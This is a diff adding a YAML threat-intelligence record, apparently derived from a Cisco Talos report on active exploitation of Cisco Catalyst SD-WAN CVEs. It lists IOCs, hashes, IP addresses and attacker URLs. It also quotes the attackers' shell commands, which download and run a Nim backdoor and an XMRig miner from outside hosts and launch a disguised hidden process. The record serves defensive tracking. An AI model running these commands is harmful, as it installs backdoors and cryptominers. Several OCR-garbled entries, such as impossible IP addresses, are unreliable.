@@ -1,0 +1,109 @@
+title: Tracking the Active Exploitation of CVE-2026-20182 and Related Vulnerabilities
+  in Cisco Catalyst SD-WAN
+description: Talos is tracking the active exploitation of CVE-2026-20182, an authentication
+  bypass vulnerability, and a series of related vulnerabilities (CVE-2026-20133, CVE-2026-20128,
+  CVE-2026-20122) in Cisco Catalyst SD-WAN Controller and Manager.
+attribution: ''
+malware_families: []
+cves:
+- CVE-2026-20182
+- CVE-2026-20133
+- CVE-2026-20128
+- CVE-2026-20122
+ttps:
+  processes: []
+  command_lines:
+  - /usr/bin/pkill -0 -U310 defunct 2>/dev/null || (TERM=xterm-256color GS_ARGS="-k/tmp/.config/htop/defunct.dat
+    -1iqD" exec -a '[mm_percpu_wql'*/tmp/.config/htop/defunct 2>/dev/null)
+  - /usr/bin/pkill -0 -U310 defunct 2>/dev/null || (TERM=xterm-256color GS_ARGS="-k/tmp/.config/htop/defunct.dat
+    -1iqD" exec -a '[mm_percpu_wql'*/tmp/.config/htop/defunct 2>/dev/null)
+  - nice /tmp/moneroocean/xmrig $x
+  powershell: []
+  scripts:
+  - /tmp/moneroocean/miner.sh --config=/tmp/moneroocean/config_background.json >/dev/null
+    2>&1
+  - su root c id
+  - '#!/bin/bashcurl -s hxxps://1a820b09-95ba-44eb-b350-4178241b725-00-1lgwuuen9b77p[.
+    Jworf[.Ireplit.dev/download -o /tmp/agentl & chmod +x /tmp/agentl86 nohup /tmp/agentl
+    > /dev/null 2>61 &'
+  - '#!/bin/bashcurl -sL -o /tmp/xmrig hxxp://83[.]1229[.]126[.]1195:8081/xmrigcurl
+    -sL -o /tmp/configl.]json hxxp://83[.]1229[.]1126[.]195:8081/configl.]isonchmod
+    +x /tmp/xmrignohup /tmp/xmrig > /tmp/xmrigl[.]log 2561 &echo "end ... "'
+  - '#!/bin/bashif | pidof xmrig >/dev/null; thennice /tmp/moneroocean/xmrig $xelseecho
+    "Monero miner is already running in the background. Refusing to run anotherone."echo
+    "Run \"killall xmrig\" or \"sudo killall xmrig\" if you want to removebackground
+    miner first."
+
+    fi'
+  registry_keys: []
+  image_loads: []
+  network_connections:
+  - systemd-resolved -> 194[.]163[.]175[.]135:4445
+  - CWan -> mtls://23.27.143[.]170:443
+  - XMRig downloader script -> hxxp://83[.]229[.]126[.]195:8081/xmrig
+  - Nim-based backdoor -> hxxps://1a820b09-95ba-44eb-b350-417e8241b725-00-1lgwuuen9b77p[.]worf[.]replit.dev/download
+  - Nim-based backdoor -> hxxp://13[.]62[.]52[.]206:5004
+  - curl -> hxxps://1a820b09-95ba-44eb-b350-4178241b725-00-1lgwuuen9b77p[.] Jworf[.Ireplit.dev/download:80
+  - curl -> hxxp://83[.]1229[.]126[.]1195:8081/xmrig:8081
+  - curl -> hxxp://83[.]1229[.]1126[.]195:8081/configl.]ison:8081
+  file_activity:
+  - /tmp/moneroocean/miner.sh
+  - /tmp/moneroocean/config_background.json
+  - systemd-resolved
+  - CWan
+  - conf.jsp
+  - sysv.jsp
+  - sysinit.jsp
+  - vmurnp_ikp.jsp
+  - loot_run.sh
+  - /tmp/agentl
+  - /tmp/xmrig
+  - /tmp/configl.]json
+  - /tmp/.config/htop/defunct.dat
+  - /tmp/.config/htop/defunct
+  - /tmp/moneroocean/xmrig
+  persistence: []
+  process_relations: []
+iocs:
+  hashes:
+  - f6f8e0d790645395188fc521039385b7c4f42fa8b426fd035f489f6cda9b5da1
+  - 02654acfb21f83485393ba8b14bd8862b919b9ec966fc6768f6aac1338a45ee8
+  - 0ed72d52347bfe4a78afff8a6982a64050c8fc86d8957a20eeb3e0f3f5342ed0
+  - 96fc528ca5e7d1c2b3add5e31b8797cb126f704976c8fbeaecdbf0aa4309ad46
+  - 7aa88a64a527ade7d93c20faf23b54f2ee33ad9b1246cdc2f8ded2ab639affb1
+  - 0c87871642f84e09e8d3fb23ec36bf55601323e31151a7017a85dbec929cf15d
+  - 18d77c9c5bbb5b9d5bdfd366fdfcf26bad9e64c63ca865fad711bcce8e3d5a80
+  - d94f75a70b5cabaf786ac57177ed841732e62bdcc9a29e06e5b41d9be567bcfa
+  - 5bc5998161056b7c8f70c9724d8a63abc7ff8c3843b91c30cffab0899e39b7f8
+  - b0f51b098842cd630097b462aab0ec357e2c7824af37cca6d08165265da2c2d3
+  - 72f570ce97de3eaaffef33d90b0c337a153fc9690cc34ee207b557d868360060
+  - 17302d903baf182f94dc3be40ab1e0874dd0eb2ec5255bf9131fd53591efe925
+  ip_addresses:
+  - 38.181.52[.]89
+  - 89.125.244[.]33
+  - 89.125.244[.]51
+  - 71.80.85[.]135
+  - 212.83.162[.]37
+  - 38.60.214[.]92
+  - 65.20.67[.]134
+  - 104.233.156[.]1
+  - 194.233.100[.]40
+  - 194[.]163[.]175[.]135
+  - 23.27.143[.]170
+  - 83[.]229[.]126[.]195
+  - 79[.]135[.]105[.]208
+  - 13[.]62[.]52[.]206
+  - 47[.]104[.]248[.]7
+  - 83[.]1229[.]126[.]1195
+  domains: []
+  urls:
+  - hxxp://83[.]229[.]126[.]195:8081/xmrig
+  - hxxp://83[.]229[.]126[.]195:8081/config.json
+  - hxxps://1a820b09-95ba-44eb-b350-417e8241b725-00-1lgwuuen9b77p[.]worf[.]replit.dev/download
+  - hxxp://13[.]62[.]52[.]206:5004
+  - hxxp://83[.]1229[.]126[.]1195:8081/xmrig
+authors:
+- Cisco Talos
+reference: https://blog.talosintelligence.com/sd-wan-ongoing-exploitation/
+date_of_publication: May 14, 2026
+file_creation_date: May 19, 2026
